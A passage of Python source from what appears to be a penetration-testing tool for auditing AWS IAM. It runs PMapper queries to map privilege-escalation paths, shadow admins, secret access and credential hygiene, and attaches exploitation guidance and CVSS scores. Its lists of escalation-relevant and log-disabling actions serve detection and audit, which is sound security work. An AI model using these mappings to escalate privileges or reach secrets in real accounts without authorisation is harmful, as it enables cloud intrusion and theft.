aws iam list-access-keys --user-name <USER>
aws iam get-access-key-last-used --access-key-id <AKIA...>''',
        "evidence": "iam:list-mfa-devices returns 0 for a user with a login profile; iam:list-access-keys shows Active long-term keys; credential report (aws iam generate-credential-report) confirms mfa_active=false and access_key_1_active=true.",
        "references": [
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_mfa.html",
            "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html",
            "https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-cis-controls.html",
        ],
    },
}


CVSS_VECTORS = {
    "admin_access":        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
    "shadow_admin":        "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
    "privesc":             "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (9.6 Critical)",
    "cross_account_trust": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0 Critical for wildcard; lower with conditions)",
    "overly_permissive":   "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L (8.1 High)",
    "secrets_access":      "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (7.7 High)",
    "credential_hygiene":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L (7.3 High for privileged no-MFA)",
}


def get_exploitation_guidance(finding_category: str) -> Dict:
    """Get exploitation guidance for a finding category."""
    category_map = {
        "admin_access": "admin_access",
        "shadow_admin": "shadow_admin",
        "privesc": "privesc",
        "privesc_critical": "privesc",
        "cross_account_trust": "cross_account_trust",
        "trust": "cross_account_trust",
        "overly_permissive": "overly_permissive",
        "secrets": "secrets_access",
        "credential_hygiene": "credential_hygiene",
        "iam": "shadow_admin",
    }
    key = category_map.get(finding_category, "overly_permissive")
    guidance = dict(EXPLOITATION_GUIDANCE.get(key, EXPLOITATION_GUIDANCE["overly_permissive"]))
    guidance["cvss_vector"] = CVSS_VECTORS.get(key, "")
    return guidance


EXCLUDE_REGIONS = "me-south-1 ap-east-1 af-south-1 eu-south-1 me-central-1 ap-southeast-3 ap-south-2 eu-south-2 eu-central-2 il-central-1 ca-west-1"


PRESET_QUERIES = [
    ("privesc_all",   ["query", "preset", "privesc", "*"],      "privesc (all principals)"),
    ("privesc_skip",  ["query", "-s", "preset", "privesc", "*"], "privesc (non-admins only)"),
    ("endgame_all",   ["query", "preset", "endgame", "*"],      "endgame"),
    ("serviceaccess", ["query", "preset", "serviceaccess"],     "service access"),
    ("wrongadmin",    ["query", "preset", "wrongadmin", "*"],   "wrong admin"),
]


MANUAL_QUERIES = [
    ("iam_create_user",              "who can do iam:CreateUser"),
    ("iam_create_access_key",        "who can do iam:CreateAccessKey"),
    ("iam_create_login_profile",     "who can do iam:CreateLoginProfile"),
    ("iam_attach_user_policy",       "who can do iam:AttachUserPolicy"),
    ("iam_attach_role_policy",       "who can do iam:AttachRolePolicy"),
    ("iam_attach_group_policy",      "who can do iam:AttachGroupPolicy"),
    ("iam_put_user_policy",          "who can do iam:PutUserPolicy"),
    ("iam_put_role_policy",          "who can do iam:PutRolePolicy"),
    ("iam_put_group_policy",         "who can do iam:PutGroupPolicy"),
    ("iam_set_default_policy_version", "who can do iam:SetDefaultPolicyVersion"),
    ("iam_create_policy_version",    "who can do iam:CreatePolicyVersion"),
    ("iam_passrole",                 "who can do iam:PassRole"),
    ("iam_add_user_to_group",        "who can do iam:AddUserToGroup"),
    ("iam_update_assume_role_policy", "who can do iam:UpdateAssumeRolePolicy"),
    ("sts_assumerole",               "who can do sts:AssumeRole"),

    ("secretsmanager_get",           "who can do secretsmanager:GetSecretValue"),
    ("ssm_get_parameter",            "who can do ssm:GetParameter"),
    ("ssm_get_parameters",           "who can do ssm:GetParameters"),
    ("ssm_get_parameters_by_path",   "who can do ssm:GetParametersByPath"),

    ("s3_get_object",                "who can do s3:GetObject"),
    ("s3_put_object",                "who can do s3:PutObject"),
    ("s3_delete_object",             "who can do s3:DeleteObject"),
    ("s3_put_bucket_policy",         "who can do s3:PutBucketPolicy"),

    ("ec2_run_instances",            "who can do ec2:RunInstances"),
    ("lambda_create_function",       "who can do lambda:CreateFunction"),
    ("lambda_update_code",           "who can do lambda:UpdateFunctionCode"),
    ("lambda_add_permission",        "who can do lambda:AddPermission"),
    ("lambda_invoke",                "who can do lambda:InvokeFunction"),
    ("glue_create_job",              "who can do glue:CreateJob"),
    ("glue_update_job",              "who can do glue:UpdateJob"),
    ("cloudformation_create_stack",  "who can do cloudformation:CreateStack"),
    ("cloudformation_update_stack",  "who can do cloudformation:UpdateStack"),
    ("codebuild_create_project",     "who can do codebuild:CreateProject"),
    ("codebuild_start_build",        "who can do codebuild:StartBuild"),
    ("sagemaker_create_training",    "who can do sagemaker:CreateTrainingJob"),
    ("sagemaker_create_notebook",    "who can do sagemaker:CreateNotebookInstance"),
    ("ecs_run_task",                 "who can do ecs:RunTask"),
    ("ecs_register_task_definition", "who can do ecs:RegisterTaskDefinition"),
    ("states_create_statemachine",   "who can do states:CreateStateMachine"),
    ("datapipeline_create_pipeline", "who can do datapipeline:CreatePipeline"),

    ("cloudtrail_stop",              "who can do cloudtrail:StopLogging"),
    ("cloudtrail_delete",            "who can do cloudtrail:DeleteTrail"),
    ("guardduty_delete",             "who can do guardduty:DeleteDetector"),
    ("config_stop",                  "who can do config:StopConfigurationRecorder"),

    ("organizations_create_policy",  "who can do organizations:CreatePolicy"),
    ("rds_describe",                 "who can do rds:DescribeDBInstances"),
    ("kms_decrypt",                  "who can do kms:Decrypt"),
    ("ec2_describe_instances",       "who can do ec2:DescribeInstances"),
]


AWS_MANAGED_POLICY_EXPANSIONS = {
    "AdministratorAccess": {"*"},
    "IAMFullAccess": {"iam:*"},
    "AdministratorAccess-Amplify": {"*"},
    "AWSOrganizationsFullAccess": {"organizations:*"},
    "AmazonS3FullAccess": {"s3:*"},
    "AWSLambda_FullAccess": {"lambda:*"},
    "AmazonEC2FullAccess": {"ec2:*"},
    "SecretsManagerReadWrite": {"secretsmanager:*", "secretsmanager:GetSecretValue"},
    "AmazonSSMFullAccess": {"ssm:*"},
    "AWSCodeBuildAdminAccess": {"codebuild:*"},
    "AWSCloudFormationFullAccess": {"cloudformation:*"},
    "PowerUserAccess": {"__POWERUSER__"},
}


def resolve_managed_policy_actions(policy_arn: str) -> Optional[Set[str]]:
    """Return the (approximate) action set for a well-known AWS-managed policy ARN.

    Returns None when the policy is AWS-managed but not in our catalog, so callers
    can flag "managed policy body unavailable; capabilities may be understated".
    Returns an empty set only for policies we know grant no escalation-relevant power.
    """
    if not policy_arn.startswith("arn:aws:iam::aws:policy/"):
        return None
    name = policy_arn.split("/")[-1]

    if name in AWS_MANAGED_POLICY_EXPANSIONS:
        actions = set(AWS_MANAGED_POLICY_EXPANSIONS[name])
        if "__POWERUSER__" in actions:
            actions = {a for a in DANGEROUS_ACTIONS if not a.startswith(("iam:", "organizations:"))}
        return actions

    m = re.match(r"^(?:Amazon|AWS)(.+?)_?FullAccess$", name)
    if m:
        return None

    if re.search(r"(ReadOnly|ViewOnly)Access$", name):
        return set()

    return None


class Colors:
    RED = "\033[1;31m"
    GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[1;34m"
    NC = "\033[0m"


def log(msg): print(f"\n{Colors.BLUE}[*]{Colors.NC} {msg}")


def ok(msg):  print(f"{Colors.GREEN}[+]{Colors.NC} {msg}")


def warn(msg): print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")


def err(msg): print(f"{Colors.RED}[-]{Colors.NC} {msg}")


class GraphLoader:
    """Load and parse PMapper graph data from JSON files."""

    def __init__(self, graph_path: Path):
        self.graph_path = Path(graph_path)
        self.nodes_file = self.graph_path / "nodes.json"
        self.edges_file = self.graph_path / "edges.json"
        self.groups_file = self.graph_path / "groups.json"
        self.policies_file = self.graph_path / "policies.json"

    def validate(self) -> bool:
        """Check if required files exist."""
        required = [self.nodes_file, self.edges_file]
        for f in required:
            if not f.exists():
                return False
        return True

    def load(self) -> Tuple[Dict[str, Principal], List[Edge], Dict[str, Policy]]:
        """Load all graph data and return parsed structures."""
        principals = self._load_nodes()
        edges = self._load_edges()
        policies = self._load_policies()
        members_by_group, policies_by_group = self._load_groups()

        for group_arn, members in members_by_group.items():
            gpols = policies_by_group.get(group_arn, [])
            for member_arn in members:
                if member_arn in principals:
                    p = principals[member_arn]
                    if group_arn not in p.group_memberships:
                        p.group_memberships.append(group_arn)
                    for pa in gpols:
                        if pa not in p.group_policy_arns:
                            p.group_policy_arns.append(pa)

        return principals, edges, policies

    def _load_nodes(self) -> Dict[str, Principal]:
        """Parse nodes.json into Principal objects."""
        principals = {}
        try:
            with open(self.nodes_file) as f:
                data = json.load(f)

            nodes = data if isinstance(data, list) else data.get("nodes", [])

            for node in nodes:
                arn = node.get("arn", node.get("Arn", ""))
                if not arn:
                    continue

                arn_parts = arn.split(":")
                account_id = arn_parts[4] if len(arn_parts) > 4 else ""
                resource = arn_parts[5] if len(arn_parts) > 5 else ""

                if resource.startswith("user/"):
                    ptype = "user"
                    name = resource.split("/")[-1]
                elif resource.startswith("role/"):
                    ptype = "role"
                    name = resource.split("/")[-1]
                elif resource.startswith("group/"):
                    ptype = "group"
                    name = resource.split("/")[-1]
                else:
                    ptype = "unknown"
                    name = resource

                attached_policies = node.get("attached_policies",
                                           node.get("AttachedPolicies", []))
                if isinstance(attached_policies, list):
                    policy_arns = [p.get("arn", p) if isinstance(p, dict) else p
                                   for p in attached_policies]
                else:
                    policy_arns = []

                is_admin = node.get("is_admin", node.get("IsAdmin", False))

                trust_policy = node.get("trust_policy",
                                       node.get("TrustPolicy",
                                               node.get("AssumeRolePolicyDocument")))

                num_keys = node.get("num_access_keys", node.get("NumAccessKeys"))
                has_keys = node.get("has_access_keys", node.get("AccessKeys", None))
                if isinstance(has_keys, list):
                    num_keys = num_keys if num_keys is not None else len(has_keys)
                    has_keys = len(has_keys) > 0
                if num_keys is None:
                    num_keys = 0
                try:
                    num_keys = int(num_keys)
                except (TypeError, ValueError):
                    num_keys = 0
                if has_keys is None:
                    has_keys = num_keys > 0

                has_mfa = bool(node.get("has_mfa", node.get("HasMFA", False)))
                active_password = bool(node.get("active_password",
                                                node.get("ActivePassword", False)))
                id_value = node.get("id_value", node.get("IdValue", "")) or ""
                instance_profile = node.get("instance_profile", node.get("InstanceProfile"))
                is_instance_profile = bool(instance_profile)
                perm_boundary = node.get("permissions_boundary",
                                         node.get("PermissionsBoundary"))
                if isinstance(perm_boundary, dict):
                    perm_boundary = perm_boundary.get("arn", perm_boundary.get("PermissionsBoundaryArn"))

                inline_policies = []
                raw_inline = node.get("inline_policies", node.get("InlinePolicies", []))
                if isinstance(raw_inline, dict):
                    raw_inline = [{"name": k, "policy_doc": v} for k, v in raw_inline.items()]
                if isinstance(raw_inline, list):
                    for ip in raw_inline:
                        if not isinstance(ip, dict):
                            continue
                        ip_name = ip.get("name", ip.get("PolicyName", "inline"))
                        ip_doc = ip.get("policy_doc", ip.get("document",
                                        ip.get("PolicyDocument", ip.get("Document", ip))))
                        inline_policies.append(Policy(
                            arn=f"{arn}/inline/{ip_name}",
                            name=ip_name,
                            statements=self._parse_statements(ip_doc),
                            is_aws_managed=False,
                        ))

                principals[arn] = Principal(
                    arn=arn,
                    name=name,
                    principal_type=ptype,
                    account_id=account_id,
                    policies=policy_arns,
                    inline_policies=inline_policies,
                    is_admin=is_admin,
                    trust_policy=trust_policy,
                    has_access_keys=bool(has_keys),
                    num_access_keys=num_keys,
                    is_instance_profile=is_instance_profile,
                    has_mfa=has_mfa,
                    active_password=active_password,
                    id_value=id_value,
                    permissions_boundary=perm_boundary,
                    tags=node.get("tags", node.get("Tags", {})),
                )

        except Exception as e:
            print(f"[!] Error loading nodes.json: {e}")

        return principals

    def _load_edges(self) -> List[Edge]:
        """Parse edges.json into Edge objects."""
        edges = []
        try:
            with open(self.edges_file) as f:
                data = json.load(f)

            edge_list = data if isinstance(data, list) else data.get("edges", [])

            for edge in edge_list:
                source = edge.get("source", edge.get("Source", ""))
                target = edge.get("destination", edge.get("target",
                                 edge.get("Destination", edge.get("Target", ""))))
                reason = edge.get("reason", edge.get("Reason", ""))
                short = edge.get("short_reason", edge.get("ShortReason", ""))

                if source and target:
                    edges.append(Edge(
                        source=source,
                        target=target,
                        reason=reason,
                        short_reason=short or reason[:100],
                    ))

        except Exception as e:
            print(f"[!] Error loading edges.json: {e}")

        return edges

    @staticmethod
    def _parse_statements(doc) -> List[PolicyStatement]:
        """Parse a policy document into PolicyStatement objects.

        Handles Action/NotAction and Resource/NotResource. Critically, Resource is
        left EMPTY (not defaulted to ['*']) when only NotResource is present, so an
        exclusion is never silently inverted into a full wildcard.
        """
        if isinstance(doc, str):
            try:
                doc = json.loads(doc)
            except Exception:
                return []
        if not isinstance(doc, dict):
            return []

        raw_stmts = doc.get("Statement", [])
        if isinstance(raw_stmts, dict):
            raw_stmts = [raw_stmts]

        statements = []
        for stmt in raw_stmts:
            if not isinstance(stmt, dict):
                continue
            actions = stmt.get("Action", [])
            if isinstance(actions, str):
                actions = [actions]
            not_actions = stmt.get("NotAction", [])
            if isinstance(not_actions, str):
                not_actions = [not_actions]

            has_resource_key = "Resource" in stmt
            resources = stmt.get("Resource", [])
            if isinstance(resources, str):
                resources = [resources]
            not_resources = stmt.get("NotResource", [])
            if isinstance(not_resources, str):
                not_resources = [not_resources]
            if not has_resource_key and not not_resources:
                resources = ["*"]

            statements.append(PolicyStatement(
                effect=stmt.get("Effect", "Allow"),
                actions=actions,
                resources=resources,
                conditions=stmt.get("Condition", {}),
                not_actions=not_actions,
                not_resources=not_resources,
                sid=stmt.get("Sid", ""),
            ))
        return statements

    def _load_policies(self) -> Dict[str, Policy]:
        """Parse policies.json into Policy objects."""
        policies = {}
        if not self.policies_file.exists():
            return policies

        try:
            with open(self.policies_file) as f:
                data = json.load(f)

            policy_list = data if isinstance(data, list) else data.get("policies", [])

            for pol in policy_list:
                arn = pol.get("arn", pol.get("Arn", ""))
                name = pol.get("name", pol.get("PolicyName", arn.split("/")[-1]))

                doc = pol.get("document", pol.get("PolicyDocument",
                             pol.get("policy_doc", pol.get("Document", {}))))
                statements = self._parse_statements(doc)

                is_aws = arn.startswith("arn:aws:iam::aws:") or any(
                    re.search(p, name) for p in AWS_MANAGED_PATTERNS
                )

                policies[arn] = Policy(
                    arn=arn,
                    name=name,
                    statements=statements,
                    is_aws_managed=is_aws,
                )

        except Exception as e:
            print(f"[!] Error loading policies.json: {e}")

        return policies

    def _load_groups(self):
        """Parse groups.json. Returns (members_by_group, policies_by_group).

        The second map (group ARN -> attached policy ARNs) was previously discarded,
        which made every permission a user holds ONLY via a group invisible to the
        capability engine.
        """
        members = {}
        group_policies = {}
        if not self.groups_file.exists():
            return members, group_policies

        try:
            with open(self.groups_file) as f:
                data = json.load(f)

            if isinstance(data, dict):
                for group_arn, val in data.items():
                    if isinstance(val, list):
                        members[group_arn] = val
                    elif isinstance(val, dict):
                        members[group_arn] = val.get("members", val.get("Members", []))
                        pols = val.get("attached_policies", val.get("AttachedPolicies", []))
                        group_policies[group_arn] = [
                            p.get("arn", p) if isinstance(p, dict) else p for p in pols
                        ]
            elif isinstance(data, list):
                for group in data:
                    arn = group.get("arn", group.get("Arn", ""))
                    if not arn:
                        continue
                    members[arn] = group.get("members", group.get("Members", []))
                    pols = group.get("attached_policies", group.get("AttachedPolicies", []))
                    group_policies[arn] = [
                        p.get("arn", p) if isinstance(p, dict) else p for p in pols
                    ]

        except Exception as e:
            print(f"[!] Error loading groups.json: {e}")

        return members, group_policies


def find_pmapper_graphs() -> List[Path]:
    """Auto-detect pmapper graph directories."""
    graphs = []

    search_paths = [
        Path.home() / ".local" / "share" / "principalmapper",
        Path.home() / ".principalmapper",
    ]

    for base in search_paths:
        if not base.exists():
            continue

        for item in base.iterdir():
            if item.is_dir():
                graph_dir = item / "graph"
                if graph_dir.exists() and (graph_dir / "nodes.json").exists():
                    graphs.append(graph_dir)
                elif (item / "nodes.json").exists():
                    graphs.append(item)

    return graphs


def get_enabled_regions(profile: str) -> List[str]:
    """Query AWS to get list of enabled (opted-in) regions for the account."""
    log(f"[*] Detecting enabled regions for profile: {profile}")

    try:
        cmd = [
            "aws", "ec2", "describe-regions",
            "--region", "us-east-1",
            "--query", "Regions[?OptInStatus!=`not-opted-in`].RegionName",
            "--output", "text",
            "--profile", profile
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        if result.returncode != 0:
            err(f"Failed to query regions: {result.stderr}")
            return []

        regions = result.stdout.strip().split()
        if regions:
            ok(f"    Found {len(regions)} enabled regions")
            return regions
        else:
            warn("    No regions returned, using default list")
            return []

    except FileNotFoundError:
        err("AWS CLI not found - install with: pip install awscli")
        return []
    except subprocess.TimeoutExpired:
        err("Region query timed out")
        return []
    except Exception as ex:
        err(f"Region query failed: {ex}")
        return []


class PMapperRunner:
    """Run pmapper commands and collect results."""

    def __init__(self, profile: str, output_dir: Path,
                 exclude_regions: str = EXCLUDE_REGIONS,
                 include_regions: Optional[List[str]] = None,
                 auto_detect_regions: bool = False):
        self.profile = profile
        self.output_dir = output_dir
        self.exclude_regions = exclude_regions
        self.include_regions = include_regions
        self.auto_detect_regions = auto_detect_regions
        self.profile_dir = output_dir / profile
        self.preset_dir = self.profile_dir / "presets"
        self.query_dir = self.profile_dir / "queries"
        self.regions_used: List[str] = []
        self.regions_excluded: List[str] = []
        self.used_auto_detect: bool = False

        for d in (self.profile_dir, self.preset_dir, self.query_dir):
            d.mkdir(parents=True, exist_ok=True)

    def run_command(self, args: List[str], outfile: Optional[Path] = None,
                   label: str = "", timeout: int = 600) -> Tuple[bool, str]:
        """Run a pmapper command. Returns (success, output)."""
        env = os.environ.copy()
        env["AWS_STS_REGIONAL_ENDPOINTS"] = "legacy"

        cmd = ["pmapper", "--profile", self.profile] + args

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                env=env,
                timeout=timeout
            )
            output = result.stdout + result.stderr

            if outfile:
                outfile.parent.mkdir(parents=True, exist_ok=True)
                with open(outfile, "a") as f:
                    f.write(output)

            if result.returncode == 0:
                if label:
                    ok(f"  {label}")
                return True, output
            else:
                if label:
                    warn(f"  {label} (non-zero exit)")
                return False, output

        except FileNotFoundError:
            err("pmapper not found - install with: pip install principalmapper")
            return False, ""
        except subprocess.TimeoutExpired:
            if label:
                warn(f"  {label} (timeout after {timeout}s)")
            return False, ""
        except Exception as ex:
            if label:
                warn(f"  {label} ({ex})")
            return False, ""

    def create_graph(self) -> bool:
        """Create the pmapper graph for this profile."""
        log("[1/5] Creating IAM graph")
        graph_log = self.profile_dir / "01_graph_create.log"

        args = ["graph", "create"]

        regions_to_use = self.include_regions

        if self.auto_detect_regions and not regions_to_use:
            regions_to_use = get_enabled_regions(self.profile)
            self.used_auto_detect = True

        if regions_to_use:
            log(f"    Using {len(regions_to_use)} regions: {', '.join(regions_to_use[:5])}{'...' if len(regions_to_use) > 5 else ''}")
            args += ["--include-regions"] + regions_to_use
            self.regions_used = regions_to_use
        elif self.exclude_regions:
            excluded = self.exclude_regions.split()
            args += ["--exclude-regions"] + excluded
            self.regions_excluded = excluded

        success, output = self.run_command(args, graph_log, "graph create", timeout=600)

        verify_success, verify_output = self.run_command(["graph", "display"])
        if "Nodes" in verify_output or "nodes" in verify_output.lower():
            ok("  Graph verified")
            return True
        elif not success:
            err(f"  Graph creation failed for {self.profile}")
            return False

        return True

    def get_graph_stats(self) -> Dict[str, str]:
        """Get graph statistics."""
        log("[2/5] Getting graph stats")
        stats_file = self.profile_dir / "02_graph_stats.txt"
        success, output = self.run_command(["graph", "display"], stats_file, "graph stats")

        stats = {}
        for line in output.splitlines():
            if "Account" in line:
                m = re.search(r"(\d{10,})", line)
                if m:
                    stats["account_id"] = m.group(1)
            elif "Nodes" in line:
                m = re.search(r"(\d+)\s*\((\d+)\s*admin", line)
                if m:
                    stats["nodes"] = m.group(1)
                    stats["admins"] = m.group(2)
            elif "Edges" in line:
                m = re.search(r"(\d+)", line)
                if m:
                    stats["edges"] = m.group(1)

        return stats

    def run_preset_queries(self) -> Dict[str, List[str]]:
        """Run all preset queries and return results."""
        log("[3/5] Running preset queries")
        results = {}

        for key, args, label in PRESET_QUERIES:
            outfile = self.preset_dir / f"{key}.txt"
            outfile.write_text(f"Query: {' '.join(args)}\n---\n")
            success, output = self.run_command(args, outfile, label)
            results[key] = self._parse_query_output(output)

        return results

    def run_manual_queries(self) -> Dict[str, List[str]]:
        """Run all manual queries and return results."""
        log("[4/5] Running manual queries")
        results = {}
        total = len(MANUAL_QUERIES)

        for i, (key, query) in enumerate(MANUAL_QUERIES, 1):
            outfile = self.query_dir / f"{key}.txt"
            outfile.write_text(f"Query: {query}\n---\n")
            success, output = self.run_command(["query", query], outfile)
            results[key] = self._parse_query_output(output)

            pct = int(i / total * 30)
            bar = "█" * pct + "░" * (30 - pct)
            print(f"\r  [{bar}] {i}/{total} {key:<40}", end="", flush=True)

        print()
        return results

    def generate_visualization(self) -> Optional[Path]:
        """Generate SVG visualization."""
        log("[5/5] Generating SVG visualization")
        svg_out = self.profile_dir / "graph.svg"
        t_before = time.time()

        self.run_command(["visualize", "--filetype", "svg"], label="SVG generation")

        search_dirs = [
            Path.home() / ".local" / "share" / "principalmapper",
            Path.home() / ".principalmapper",
            Path("."),
        ]

        found_svg = None
        for sdir in search_dirs:
            if not sdir.exists():
                continue
            for svg in sdir.rglob("*.svg"):
                if svg.stat().st_mtime >= t_before - 2:
                    found_svg = svg
                    break
            if found_svg:
                break

        if found_svg:
            shutil.copy2(str(found_svg), str(svg_out))
            ok(f"  SVG saved to {svg_out}")
            return svg_out
        else:
            warn("  SVG not found")
            return None

    def _parse_query_output(self, output: str) -> List[str]:
        """Parse pmapper query output into list of findings."""
        findings = []
        for line in output.splitlines():
            line = line.strip()
            if not line:
                continue
            if line.startswith("Query:") or line == "---":
                continue
            if "No results" in line or "0 results" in line:
                continue
            findings.append(line)
        return findings

    def run_full_analysis(self) -> Tuple[Dict[str, str], Dict[str, List[str]], Optional[Path]]:
        """Run complete pmapper analysis. Returns (stats, all_results, svg_path)."""
        if not self.create_graph():
            return {}, {}, None

        stats = self.get_graph_stats()

        preset_results = self.run_preset_queries()
        manual_results = self.run_manual_queries()

        all_results = {**preset_results, **manual_results}

        svg_path = self.generate_visualization()

        ok(f"Profile {self.profile} complete")
        return stats, all_results, svg_path


class AnalysisEngine:
    """Core analysis engine for IAM security assessment."""

    def __init__(self, principals: Dict[str, Principal], edges: List[Edge],
                 policies: Dict[str, Policy], account_id: str = ""):
        self.principals = principals
        self.edges = edges
        self.policies = policies
        self.account_id = account_id or self._detect_account_id()

        self.edge_from: Dict[str, List[Edge]] = defaultdict(list)
        self.edge_to: Dict[str, List[Edge]] = defaultdict(list)
        for edge in edges:
            self.edge_from[edge.source].append(edge)
            self.edge_to[edge.target].append(edge)

        self.admins: Set[str] = {
            arn for arn, p in principals.items() if p.is_admin
        }

    def _detect_account_id(self) -> str:
        """Extract account ID from principal ARNs."""
        for arn in self.principals:
            parts = arn.split(":")
            if len(parts) > 4 and parts[4].isdigit():
                return parts[4]
        return "unknown"

    def analyze(self) -> AccountAnalysis:
        """Run full analysis and return results."""
        analysis = AccountAnalysis(
            account_id=self.account_id,
            account_alias=self.account_id,
            node_count=len(self.principals),
            edge_count=len(self.edges),
            admin_count=len(self.admins),
            principals=self.principals,
            edges=self.edges,
            policies=self.policies,
        )

        self._compute_all_capabilities()

        analysis.shadow_admins = self._find_shadow_admins()
        shadow_arns = {p.arn for p in analysis.shadow_admins}
        analysis.overly_permissive = self._find_overly_permissive(exclude_arns=shadow_arns)
        analysis.aws_managed_admins = self._find_aws_managed_admins()
        analysis.escalation_paths = self._find_escalation_paths()
        analysis.cross_account_trusts = self._analyze_cross_account_trusts()
        analysis.credential_hygiene = self._find_credential_hygiene_issues()
        analysis.findings = self._generate_findings(analysis)

        return analysis

    def _find_aws_managed_admins(self) -> List[Principal]:
        """Find AWS-managed roles that are admins (expected but worth noting)."""
        managed = []
        for arn, principal in self.principals.items():
            if principal.is_admin and self._is_aws_managed(principal.name):
                managed.append(principal)
        return managed

    def _find_credential_hygiene_issues(self) -> List[Dict[str, Any]]:
        """Credential-hygiene findings a real IAM assessment must include.

        Uses fields the graph carries (has_mfa, active_password, num_access_keys) that
        the tool previously discarded: privileged principals without MFA, console users
        without MFA, and principals holding long-term access keys.
        """
        issues = []
        for arn, p in self.principals.items():
            if p.principal_type != "user":
                continue
            privileged = p.is_admin or bool(p.dangerous_actions)
            flags = []
            if p.active_password and not p.has_mfa:
                flags.append("console password WITHOUT MFA")
            if p.num_access_keys and p.num_access_keys > 0:
                flags.append(f"{p.num_access_keys} active long-term access key(s)")
            if p.num_access_keys and p.num_access_keys > 1:
                flags.append("multiple concurrent access keys (rotation hygiene)")
            if not flags:
                continue
            if p.active_password and not p.has_mfa and privileged:
                sev = "high"
            elif p.active_password and not p.has_mfa:
                sev = "medium"
            elif p.num_access_keys and privileged:
                sev = "medium"
            else:
                sev = "low"
            issues.append({
                "arn": arn,
                "name": p.name,
                "is_admin": p.is_admin,
                "privileged": privileged,
                "has_mfa": p.has_mfa,
                "active_password": p.active_password,
                "num_access_keys": p.num_access_keys or 0,
                "id_value": p.id_value,
                "severity": sev,
                "flags": flags,
            })
        order = {"high": 0, "medium": 1, "low": 2}
        return sorted(issues, key=lambda x: (order.get(x["severity"], 3), not x["is_admin"], x["name"]))

    @staticmethod
    def _expand_action(action: str) -> Set[str]:
        """Return the subset of DANGEROUS_ACTIONS an Action string grants."""
        if action == "*":
            return set(DANGEROUS_ACTIONS)
        if action.endswith(":*"):
            service = action.split(":")[0]
            return {d for d in DANGEROUS_ACTIONS if d.startswith(service + ":")}
        if action in DANGEROUS_ACTIONS:
            return {action}
        return set()

    def _dangerous_covered_by_statement(self, stmt: PolicyStatement) -> Set[str]:
        """Dangerous actions a statement's Action/NotAction clause matches."""
        if stmt.not_actions:
            excluded = set()
            for na in stmt.not_actions:
                excluded |= self._expand_action(na)
            return DANGEROUS_ACTIONS - excluded
        covered = set()
        for a in stmt.actions:
            covered |= self._expand_action(a)
        return covered

    def _effective_policies(self, principal: Principal):
        """Every identity policy in effect for a principal, resolved.

        Includes directly-attached, inline, and group-inherited policies. AWS-managed
        policies absent from the graph are resolved from the built-in catalog; ones we
        cannot resolve are recorded on principal.unresolved_managed so the report can
        state that computed capabilities may be understated.
        Returns list of (Policy, source_label).
        """
        out = []
        seen = set()

        def add_by_arn(pa, source):
            if not pa or (pa, source) in seen:
                return
            seen.add((pa, source))
            pol = self.policies.get(pa)
            if pol:
                out.append((pol, source))
                return
            acts = resolve_managed_policy_actions(pa)
            if acts is None:
                if pa.startswith("arn:aws:iam::aws:policy/") and pa not in principal.unresolved_managed:
                    principal.unresolved_managed.append(pa)
                return
            synth = Policy(
                arn=pa, name=pa.split("/")[-1], is_aws_managed=True,
                statements=[PolicyStatement(effect="Allow",
                                            actions=sorted(acts) if acts else [],
                                            resources=["*"])],
            )
            out.append((synth, source))

        for pa in principal.policies:
            add_by_arn(pa, "attached")
        for pa in principal.group_policy_arns:
            add_by_arn(pa, "group")
        for ip in principal.inline_policies:
            out.append((ip, "inline"))
        return out

    def _compute_all_capabilities(self):
        """Compute effective dangerous actions per principal, AWS-faithfully.

        Honors: Allow/Deny (broad unconditional Deny subtracts), NotAction, inline and
        group-inherited policies, the AdministratorAccess/managed-policy catalog, the
        is_admin flag, and permissions boundaries (intersection when resolvable, else a
        'boundary_capped' flag). Records per-action evidence for reporting.
        """
        for arn, principal in self.principals.items():
            allow = {}
            deny = set()
            principal.boundary_capped = bool(principal.permissions_boundary)

            for pol, source in self._effective_policies(principal):
                for stmt in pol.statements:
                    if stmt.effect == "Allow":
                        if stmt.not_actions:
                            principal.has_notaction = True
                        covered = self._dangerous_covered_by_statement(stmt)
                        for a in covered:
                            if a not in allow:
                                allow[a] = {
                                    "policy": pol.arn,
                                    "policy_name": pol.name,
                                    "source": source,
                                    "sid": stmt.sid,
                                    "resources": list(stmt.resources) or (["<NotResource>"] if stmt.not_resources else ["*"]),
                                    "conditions": bool(stmt.conditions),
                                }
                    elif stmt.effect == "Deny":
                        broad = ("*" in stmt.resources) or bool(stmt.not_resources) or (not stmt.resources)
                        if broad and not stmt.conditions:
                            deny |= self._dangerous_covered_by_statement(stmt)

            if principal.is_admin:
                for a in DANGEROUS_ACTIONS:
                    allow.setdefault(a, {
                        "policy": "arn:aws:iam::aws:policy/AdministratorAccess",
                        "policy_name": "AdministratorAccess",
                        "source": "admin", "sid": "", "resources": ["*"], "conditions": False,
                    })

            dangerous = set(allow) - deny

            if principal.permissions_boundary:
                bpol = self.policies.get(principal.permissions_boundary)
                bacts = None
                if bpol:
                    bacts = set()
                    for stmt in bpol.statements:
                        if stmt.effect == "Allow":
                            bacts |= self._dangerous_covered_by_statement(stmt)
                else:
                    bacts = resolve_managed_policy_actions(principal.permissions_boundary)
                if bacts is not None:
                    dangerous &= bacts

            principal.dangerous_actions = dangerous
            principal.action_evidence = {a: allow[a] for a in dangerous if a in allow}

            groups = self._classify_capabilities(dangerous)
            principal.capability_groups = groups

            principal.capabilities = [
                CHECK_LABEL.get(action, action)
                for action in sorted(dangerous)
                if action in CHECK_LABEL
            ]

    def _classify_capabilities(self, actions: Set[str]) -> List[Tuple[str, str, List[str]]]:
        """Classify actions into capability groups with severity."""
